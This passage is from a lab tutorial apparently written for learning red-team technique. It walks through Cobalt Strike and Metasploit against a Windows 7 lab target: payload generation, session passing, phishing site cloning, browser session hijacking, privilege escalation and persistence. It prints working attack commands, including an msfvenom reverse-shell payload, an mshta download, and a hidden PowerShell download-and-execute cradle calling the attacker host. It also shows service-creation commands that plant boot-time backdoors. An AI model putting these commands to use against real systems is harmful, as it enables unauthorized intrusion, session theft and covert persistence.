table：目标表</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205427113.png" alt="image-20200624205427113"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205623348.png" alt="image-20200624205623348"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vpn lnterfaces ：vpn接口，一般在公网环境下很实用</span><br><span class="line">listeners ：建立个反弹shell的监听器</span><br><span class="line">Script manager 用于脚本管理，CS可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span><br></pre></td></tr></table></figure><p>创建listener之后，是选择攻击方式：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624205925400.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTML Application：生成hta文件</span><br><span class="line">MS Office Macro：宏office文件</span><br><span class="line">Payload Generator：生成各种语言版本的payload</span><br><span class="line">Windows Executable payload：生成可执行文件 (一般使用这个)</span><br><span class="line">Windows Executable (S)：把包含payload,Stageless生成可执行文件</span><br></pre></td></tr></table></figure><p>生成文件之后就是该投递文件了，也就是创建一个渠道，能够让靶机下载执行生成的恶意文件。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624210350484.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CS支持的方式包括：</span><br><span class="line">Manage 开启的所有web服务</span><br><span class="line">Clone site 克隆网站</span><br><span class="line">Host File 提供Web以供下载某文件</span><br><span class="line">Scripted Web Delivery 为payload提供web服务以便于下载和执行</span><br><span class="line">Signed Applet Attack 启动一个Web服务以提供自签名JavaApplet的运行环境</span><br><span class="line">Smart Applet Attack 自动检测Java版本并利用已知的exploits绕过security</span><br><span class="line">System Profiler 获取系统，Flash，浏览器版本等</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200624210729697.png" alt></p><p>第三个菜单是SpearPhish，即鱼叉式网络钓鱼。</p><p>在以上线主机会话，右键interact可以开启beacon，可以用它来执行各种命令</p><p>在Cobalt Strike中它的心跳默认是60s，默认60s一次回传，这会让我们执行的命令响应很慢，在下载文件面前更为明显，所以实验时会把时间降低一点。但是在实战时应根据实战环境来调节，建议不要太快，不然流量特征会过于明显，容易暴露自己。</p><p>设置为如下，让靶机每5s下载一次任务：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624211057336.png" alt="image-20200624211057336"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200624211142583.png" alt="image-20200624211142583"></p><p>会话右键的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Interact 打开beacon</span><br></pre></td></tr></table></figure><p>Access：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dumphashes 获取hash</span><br><span class="line">Elevate 提权</span><br><span class="line">GoldenTicket 生成黄金票据注入当前会话</span><br><span class="line">MAketoken  凭证转换</span><br><span class="line">RunMimikatz  运行Mimikatz</span><br><span class="line">SpawnAs 用其他用户生成CobaltStrike侦听器</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200624212142221.png" alt></p><p>Explore:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BrowserPivot 劫持目标浏览器进程</span><br><span class="line">Desktop(VNC)  桌面交互</span><br><span class="line">FileBrowser  文件浏览器</span><br><span class="line">NetView 命令Net View</span><br><span class="line">Portscan 端口扫描</span><br><span class="line">Processlist 进程列表</span><br><span class="line">screenshot 截屏</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200624212401816.png" alt></p><p>Pivoting：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOCKS Server 代理服务</span><br><span class="line">Listener  反向端口转发</span><br><span class="line">DeployVPN 部署VPN</span><br></pre></td></tr></table></figure><p>Spawn 派生新的通讯模式并生成会话</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624212548018.png" alt></p><p>Session 会话管理，删除，心跳时间，退出，备注。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200624212654228.png" alt></p><p>很多常用功能在view里选中够都能直接使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Applications 用于显示System Profiler获取的目标浏览器，操作系统，flash版本</span><br><span class="line">Credentials 显示所有已经获取的用户主机hash</span><br><span class="line">Downloads 显示下载的文件</span><br><span class="line">Event log 事件日志记录团队 目标上线等记录</span><br><span class="line">Keystrokes 目标键盘记录</span><br><span class="line">Proxy Pivots 代理信息</span><br><span class="line">Screenshots 屏幕截图</span><br><span class="line">Script Console 加载自定义脚本</span><br><span class="line">Targets 显示所有主机</span><br><span class="line">Web log  web服务日志</span><br></pre></td></tr></table></figure><p>这些选项直接打开是没有用的，得在beacon中执行相应命令后才能使用。</p><h4 id="与msf交互派生shell"><a href="#与msf交互派生shell" class="headerlink" title="与msf交互派生shell"></a>与msf交互派生shell</h4><p><strong>一、Cobalt strike派生shell给metasploit</strong></p><p>首先在metasploit处创建一个handler (Metasploit的exploit/multi/handler模块是一个有效负载处理程序,它只处理在受损主机中执行的有效负载连接。</p><p>在kali中执行“msfconsole”，启动metasploit。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625202014366.png" alt></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625202103140.png" alt></p><p>启动后输入如下图命令，用于在metasploit处创建一个handler。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 172.16.12.135</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200625202848116.png" alt></p><p>接下来使用cobaltstrike创建一个listener</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625203014797.png" alt></p><p>启动cobaltstrike</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625203909870.png" alt="image-20200625203909870"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204106793.png" alt="image-20200625204106793"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204215728.png" alt="image-20200625204215728"></p><p>新建监听</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204351548.png" alt="image-20200625204351548"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204603432.png" alt="image-20200625204603432"></p><p>先生成恶意文件，注意，这里是针对test这个listenr，不要搞错了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204759067.png" alt="image-20200625204759067"></p><p>然后web driver by-&gt;host file</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625204937547.png" alt="image-20200625204937547"></p><p>点击launch即可,切换到win7靶机，输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;172.16.12.137:80&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure><p>切回kali，可以看到靶机已上线：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625205245503.png" alt="image-20200625205245503"></p><p>下一步派生会话</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625205414116.png" alt="image-20200625205414116"></p><p>选择msf的listener</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625205559497.png" alt="image-20200625205559497"></p><p>此时就拿到了meterpreter</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625210340348.png" alt="image-20200625210340348"></p><p><strong>二、metasploit派生会话给Cobaltstrike</strong></p><p>cobalt派生shell给metasploit，同样的，metasploit也可以派生shell给cobalt strike。</p><p>首先在cobaltstrike创建一个listenr，等会用于接收msf派生的shell：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625210741841.png" alt="image-20200625210741841"></p><p>接下来启动msf,通过msf得拿到meterpreter。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先用msfvenom生成恶意文件:</span><br><span class="line">msfvenom  -p  windows&#x2F;meterpreter&#x2F;reverse_tcp  lhost&#x3D;172.16.12.135  lport&#x3D;4444  -f  exe  -o  test.exe</span><br><span class="line">然后开启监听:</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200625211533398.png" alt></p><p>将生成的test.exe拷到win7靶机中，进行执行，获取到meterpreter</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625212312077.png" alt="image-20200625212312077"></p><p> 将其切换到后台，然后使用下面的模块，功能是注入一个新的payload 到当前的session里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200625212516697.png" alt="image-20200625212516697"></p><p>设置其他选项，这里的payload设置为reverse_http，是因为前面cobalt strike的也是reverse_http,lport也要和CS的相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lhost 172.16.12.137（cobaltatrike IP）</span><br><span class="line">set lport 5555 （cobaltstrike监听端口）</span><br><span class="line">set seesion 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200625214105555.png" alt="image-20200625214105555"></p><p>然后执行</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625214203173.png" alt="image-20200625214203173"></p><p>此时cobaltstrike拿到了metasploit派生的shell了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625214239474.png" alt="image-20200625214239474"></p><h4 id="AggressorScript"><a href="#AggressorScript" class="headerlink" title="AggressorScript"></a>AggressorScript</h4><p><strong>一、简介</strong></p><p>CobaltStrike强大的可扩展性注定了它在渗透工具中的地位，这些扩展脚本实际上都是使用Aggressor Script写的，Aggressor Script基于Sleep，一种由Raphael Mudge（也是Cobalt Strike的作者）创建的语言。</p><p>直接从拿到beacon开始:</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625221314363.png" alt="image-20200625221314363"></p><p>从GitHub clone第三方脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;harleyQu1nn&#x2F;AggressorScripts.git</span><br></pre></td></tr></table></figure><p>Cobalt strike-&gt;script manager</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625221902177.png" alt="image-20200625221902177"></p><p>比如导入一个processcolor.cna，下图的ready打钩就说明导入成功可以使用了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222026863.png" alt="image-20200625222026863"></p><p>使用ps命令看下效果，不同的进程会显示不同的颜色：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222247314.png" alt="image-20200625222247314"></p><p>导入RedTeamRepo.cna试下：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222348361.png" alt="image-20200625222348361"></p><p>用法如下</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222532884.png" alt="image-20200625222532884"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222555218.png" alt="image-20200625222555218"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222626311.png" alt="image-20200625222626311"></p><p>这些扩展脚本实际上都是使用Aggressor Script写的，Aggressor Script基于Sleep，一种由Raphael Mudge（也是Cobalt Strike的作者）创建的语言。 Sleep基本上是一种在JVM上运行的类似Perl的语言。</p><p>在cs中view-&gt;script console，打开script控制台之后与其进行交互，我们可以在这儿跟踪，配置，调试和管理脚本。输入help可以查看帮助</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222823103.png" alt="image-20200625222823103"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200625222923820.png" alt="image-20200625222923820"></p><p>具体的参数及用法如下表所示</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625223027582.png" alt="image-20200625223027582"></p><p>首先以helloword为例，写一个完整的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先用subhello&#123;&#125;创建一个名为hello的函数</span><br><span class="line">然后打印消息到控制台println(“hello world!”);</span><br></pre></td></tr></table></figure><p>注意语句使用分号结尾，并且必须在调用函数之前定义函数。因为hello不接收任何参数，所以直接使用hello()调用。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625224251376.png" alt></p><p>使用load加载cna脚本所在位置</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625224501743.png" alt></p><p>也可以直接在脚本窗口使用一句话实现这个功能：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625224733048.png" alt></p><p>输出我们已经学会了，那么我们可以输入吗？我们接下来要实现能够输出hello,xx的功能。</p><p>需要使用command关键字注册命令，这样我们就可以允许脚本通过控制台从用户接收触发器。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625225006780.png" alt></p><p>这段代码注册命令hello，脚本控制台会自动解析命令的参数。加载测试看看：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625225130272.png" alt="image-20200625225130272"></p><p>使用hello命令，传入mys3t，打印出了hello mys3t，实现了与cs的交互功能。</p><p><strong>二、sleep语言中的各种数据类型以及如何使用</strong></p><p> Sleep中的数据类型主要是字符串，数组和hash，字符串用$表示，数组用@表示，hash用％表示。</p><p>字符串包含字符或字符串; 数组可以包含多个字符串、数组或hash（可以在数组中混合类型）; 和散列包含多个键值对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line">e $string &#x3D; &quot;This is a string.&quot;;</span><br><span class="line">e @array &#x3D; @(&quot;This first element.&quot;,2,$string);</span><br><span class="line">e %hash &#x3D; %(key1 &#x3D;&gt; &quot;vlaue&quot;,key2 &#x3D;&gt; @array,key3 &#x3D;&gt; $string);</span><br></pre></td></tr></table></figure><p>如何访问数组和hash中的数字。首先，数组中包含的数据可以通过其索引或其在数组中的位置来访问，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e @array &#x3D; @(&quot;First&quot;,&quot;Second&quot;,&quot;Third&quot;);</span><br><span class="line">x @array[0]</span><br><span class="line">x @array[1]</span><br></pre></td></tr></table></figure><p>还可以使用println直接打印这些值，”.”符号将两个值连接起来:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e println(&quot;The first value is:&quot;.@array[0]);</span><br></pre></td></tr></table></figure><p>  Hash也是类似的方式，不过使用的是键，而不是索引</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e %hash &#x3D; %(key1 &#x3D;&gt; &quot;value1&quot;,key2 &#x3D;&gt; &quot;value2&quot;,key3 &#x3D;&gt; &quot;value3&quot;);</span><br><span class="line">x %hash[&#39;key1&#39;]</span><br></pre></td></tr></table></figure><p>Cobalt Strike的核心是Cobalt Strike数据模型。 这是我们可访问的所有信息的地方，它为我们提供了大量数据，用于CobaltStrike中的自动化操作。 数据模型中收集的数据包括有关当前beacon的信息，从受感染系统收集的凭据，屏幕截图，下载的文件以及许多其他内容。</p><p>我们可以使用beacons()函数（Aggressor中的内置函数）获取所有当前连接的beacon的数组。 我们可以在脚本控制台中使用x beacons()查看此信息，我们会得到有关每个beacon的大量信息。 beacon以数组排列，每个beacon作为哈希存储在该数组中。 这就是数据模型中单个beacon的样子</p><p><img src="/2020/07/03/Cobaltstrike/image-20200625230524018.png" alt="image-20200625230524018"></p><h2 id="Cobaltstrike钓鱼与劫持"><a href="#Cobaltstrike钓鱼与劫持" class="headerlink" title="Cobaltstrike钓鱼与劫持"></a>Cobaltstrike钓鱼与劫持</h2><h4 id="网站克隆劫持"><a href="#网站克隆劫持" class="headerlink" title="网站克隆劫持"></a>网站克隆劫持</h4><p>钓鱼攻击是社会工程学攻击的一种方式。钓鱼攻击使用电子邮件或者恶意网站引诱人们提供个人信息(用户名、密码、金融信息等)。</p><p>前提是靶机上线，在cs中获取靶机权限</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105102846.png" alt="image-20200627105102846"></p><p>选中会话后右键Interact,打开beacon console，为快速显示结果，将sleep设置为0</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105134958.png" alt="image-20200627105134958"></p><p>接下来克隆网站， Attacks-&gt;web driver by -&gt;clone site</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105345933.png" alt="image-20200627105345933"></p><p>  Clone url输入要克隆的网页的地址，Local port最好不要输80，避免冲突</p><p> 点击clone</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105435156.png" alt="image-20200627105435156"></p><p>接下来在win上输入上面给出的url，可以看到这是克隆了dvwa登录界面的钓鱼网页</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627105513687.png" alt="image-20200627105513687"></p><p>输入用户名、密码，然后在cobaltstrike中调出web log</p><p>此处失败，没有成功获取web log里的密码。</p><h4 id="BrowserPivot"><a href="#BrowserPivot" class="headerlink" title="BrowserPivot"></a>BrowserPivot</h4><p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。在实际的渗透过程中，用户登录的邮箱，后台管理以及其他的业务系统，也都可以利用此方法来进行登录，在远程用户没有察觉的情况下，获取到我们所需要的信息。 </p><p>前提依然是已经拿到靶机权限</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627111454699.png" alt="image-20200627111454699"></p><p>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制。所以我们切换到windows上，打开IE浏览器访问dvwa。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627111618860.png" alt="image-20200627111618860"></p><p>输入用户名、密码进入登录后的界面</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627111822523.png" alt="image-20200627111822523"></p><p>接下来，通过Browser pivot来直接登录受害者登录的网站。</p><p> 操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用ps命令找到浏览器进程</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627111944827.png" alt="image-20200627111944827"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后注入进程，选中控制会话后右键explore-&gt;Browser Pivot</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627112058806.png" alt="image-20200627112058806"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200627112213750.png" alt="image-20200627112213750"></p><p>选择一个后面打钩的,因为我们需要插入Internet Explorer以继承用户的已验证Web会话。IE的新版本会为每个选项卡生成一个进程，我们必须将其插入子选项卡以继承会话状态。通常，子选项卡共享所有会话状态。通过查看PPID值来标识IE子选项卡进程，当PPID引用explorer.exe时，该进程不是子选项卡；当PPID引用iexplore.exe时，该进程就是子选项卡。Cobalt Strike也自动为我们选择了最佳的注入进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选中后点击launch</span><br></pre></td></tr></table></figure><p>此时在beacon shell中会显示http代理服务器的信息</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627113044989.png" alt></p><p>不设置代理的情况，kali上访问win上搭的dvwa，但是会自动跳转到下图的登录界面</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627114216896.png" alt="image-20200627114216896"></p><p>接下来打开kali上的火狐设置本地浏览器代理，在设置中找到network proxy，选择手动设置，设置为cs给出的地址和端口</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627120016695.png" alt="image-20200627120016695"></p><p>设置好后点击ok， 然后访问win中同样的网址http[:]//172.16.12.136/index.php,已经自动登录了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627120201199.png" alt="image-20200627120201199"></p><p> 要关闭代理的话可以输入命令browserpivot stop。</p><h2 id="Cobaltstrike权限维持"><a href="#Cobaltstrike权限维持" class="headerlink" title="Cobaltstrike权限维持"></a>Cobaltstrike权限维持</h2><h4 id="提权及spawn"><a href="#提权及spawn" class="headerlink" title="提权及spawn"></a>提权及spawn</h4><p>除了使用cs自带的提权exp进行提权，事实上我们可以使用外部准备好的exp来提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三方提权攻击库：ElevateKit</span><br><span class="line">下载到kali：git clone https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;ElevateKit.git</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627153234208.png" alt="image-20200627153234208"></p><p>选中后右键Interact，打开beacon console， 通过elevate-kit高效提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在beacon shell中输入elevate</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627153746186.png" alt="image-20200627153746186"></p><p>这是cs自带的, 接下来我们可以导入cna文件丰富我们的漏洞库</p><p> 点击左上角cobalt strike-&gt;script manager</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627153457951.png" alt="image-20200627153457951"></p><p> 点击load,找到下载的ElevateKit工具路径，选择cna文件</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627153526469.png" alt="image-20200627153526469"></p><p>通过右键-&gt;access-&gt;elevate</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627154926418.png" alt="image-20200627154926418"></p><p>点击launch，在beacon shell中会有回显信息</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627155017172.png" alt="image-20200627155017172"></p><p>根据回显可知已经提权成功</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627155046277.png" alt="image-20200627155046277"></p><p>派生场景：</p><p>假如你同事跟你说，他需要你那个目标的shell，但又不想直接连到你的团队服务器上。事实上，这个场景非常常见，cs针对这种场景的解决办法就是：让他直接在他本地起一个团队服务器创建个监听器，然后你再用你的cobaltstrike客户端连到他的团队服务器上，最后，把他要那个目标的shell派生到他指定的那个监听器上即可。</p><p>第一步，另开一台kali</p><p>在新开kali上启动teamserver：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627163733140.png" alt="image-20200627163733140"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200627163937927.png" alt="image-20200627163937927"></p><p>然后在这台kali上启动一个客户端，这里的host是本地的，点击connect，进入后可以在下图可以看到此时是没有beacon的</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164255596.png" alt="image-20200627164255596"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164329043.png" alt="image-20200627164329043"></p><p>创建listener</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164442315.png" alt="image-20200627164442315"></p><p> 第二步，切换到第一台kali</p><p>在上一台已经拿到beacon的客户端上，创建新的连接，连接到172.16.12.135这台kali启动的teamserver上</p><p>点击左上角，cobalt strike-&gt;new connection</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164742511.png" alt="image-20200627164742511"></p><p>在左下角我们可以看到，在客户端这儿是可以切换两台teamserver的</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627164900333.png" alt="image-20200627164900333"></p><p>切换至<a href="mailto:mys3t@172.16.12.137">mys3t@172.16.12.137</a>，选中一个beacon，右键spawn</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627165033323.png" alt="image-20200627165033323"></p><p>  然后选中在172.16.12.135的cs客户端上创建的listener</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627165115096.png" alt="image-20200627165115096"></p><p> 第三步，切换到172.16.12.135的cs客户端</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627165231755.png" alt="image-20200627165231755"></p><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。需要了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。</p><p><strong>一、设置powershell脚本开机自启动后门</strong></p><p>启动teamserver及客户端</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627171252453.png" alt="image-20200627171252453"></p><p>点击Attacks-&gt;web driver-by -&gt;script web delivery</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627171435897.png" alt="image-20200627171435897"></p><p>点击launch后出现如下</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627171506690.png" alt="image-20200627171506690"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;172.16.12.137:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure><p>复制到靶机运行后：</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627171631310.png" alt="image-20200627171631310"></p><p>此时拿到了普通用户权限的beacon</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627174534770.png" alt="image-20200627174534770"></p><p>打开becaon shell输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;TEST&quot; binpath&#x3D; &quot;cmd &#x2F;c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;172.16.12.137:80&#x2F;a&#39;))\&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627175322499.png" alt="image-20200627175322499"></p><p>切换到靶机，查看服务，输入services.msc命令即可,  在服务中找到了名为TEST的项</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627175439053.png" alt="image-20200627175439053"></p><p>此时启动类型还是手动，设置为自动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon  shell sc config &quot;TEST&quot; start&#x3D; auto</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627175557809.png" alt="image-20200627175557809"></p><p> 在服务中右键-》刷新，可以看到类型已经是自动了</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627175648761.png" alt="image-20200627175648761"></p><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net start &quot;TEST&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200627175937521.png" alt="image-20200627175937521"></p><p>然后重启靶机，通过powershell留开机自启动服务，当目标主机重启电脑之后,不断向攻击机器发送请求数据包，重新拿到控制权限。</p><p><img src="/2020/07/03/Cobaltstrike/image-20200627180708776.png" alt="image-20200627180708776"></p><p><strong>二、通过service留自启动后门，生成一个exe后门</strong></p><p>Attacks-&gt;packages-&gt;windows executable</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628210956455.png" alt="image-20200628210956455"></p><p>然后右键explore&gt;file browser</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628211202167.png" alt="image-20200628211202167"></p><p>把生成的exe程序上传到靶机</p><p><img src="/2020/07/03/Cobaltstrike/image-20200628211248927.png" alt="image-20200628211248927"></p><p><img src="/2020/07/03/Cobaltstrike/image-20200628211640028.png" alt="image-20200628211640028"></p><p>  创建项及路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;server power&quot; binpath&#x3D; &quot;C:\test.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/03/Cobaltstrike/image-20200628211758573.png" 